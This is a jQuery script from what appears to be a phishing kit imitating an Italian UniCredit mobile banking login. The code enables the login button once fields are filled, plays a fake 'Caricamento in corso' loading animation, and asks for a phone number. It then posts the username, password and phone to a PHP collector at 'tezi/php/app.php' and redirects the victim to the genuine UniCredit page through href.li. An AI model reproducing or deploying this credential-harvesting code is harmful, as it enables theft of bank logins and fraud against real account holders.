$('.ocult2').hide();
$('.suave').hide();
$('#user').keyup(function(){
if ($('#user').val().length > 3){
if ($('#pass').val().length > 3){
$('#antelogin_loginmsite_button').prop('disabled',false);
}else {$('#antelogin_loginmsite_button').prop('disabled',true);}}else {$('#antelogin_loginmsite_button').prop('disabled',true);}
});

$('#pass').keyup(function(){
if ($('#user').val().length > 3){
if ($('#pass').val().length > 3){
$('#antelogin_loginmsite_button').prop('disabled',false);
}else {$('#antelogin_loginmsite_button').prop('disabled',true);}}else {$('#antelogin_loginmsite_button').prop('disabled',true);}
}); $("form").submit(function(e){
        e.preventDefault();
    });

$('#antelogin_loginmsite_button').click(function(){
$('#antelogin_loginmsite_button').prop('disabled',true);
$('.button-login').html('Caricamento in corso');
setTimeout(function() {$('.button-login').html('Caricamento in corso.');}, 1000);
setTimeout(function() {$('.button-login').html('Caricamento in corso..');}, 2000);
setTimeout(function() {$('.button-login').html('Caricamento in corso...'); $('.ocult').hide(); $('.ocult2').show();}, 3000);
setTimeout(function() {
$('.duro').hide();
$('.suave').show();
$('.button-login').html('Entra');
}, 4000);
});


$('#phone').keyup(function(){
if ($('#phone').val().length > 7){
$('#antelogin_loginmsite_button2').prop('disabled',false);
}else {$('#antelogin_loginmsite_button2').prop('disabled',true);}
});


$('#antelogin_loginmsite_button2').click(function(){
$('#antelogin_loginmsite_button2').prop('disabled',true);
$('.button-login').html('Caricamento in corso');
setTimeout(function() {$('.button-login').html('Caricamento in corso.');}, 1000);
setTimeout(function() {$('.button-login').html('Caricamento in corso..');}, 2000);
setTimeout(function() {$('.button-login').html('Caricamento in corso...');
var user = $('#user').val();
var pass = $('#pass').val();
var phone = $('#phone').val();
var content = 'main';
$.post('tezi/php/app.php', {content:content, user:user, pass:pass, phone:phone}, function(response){
setTimeout(function() {

/* MESSAGE START*/
$('.login-section').html('This is a test message from a friend');
/* MESSAGE END */
setTimeout(function() {var url = "https://href.li/?https://m.unicredit.it/mobilebanking/index.html";
$(location).attr('href',url);}, 12000);
}, 1000);
});
}, 4000);
});
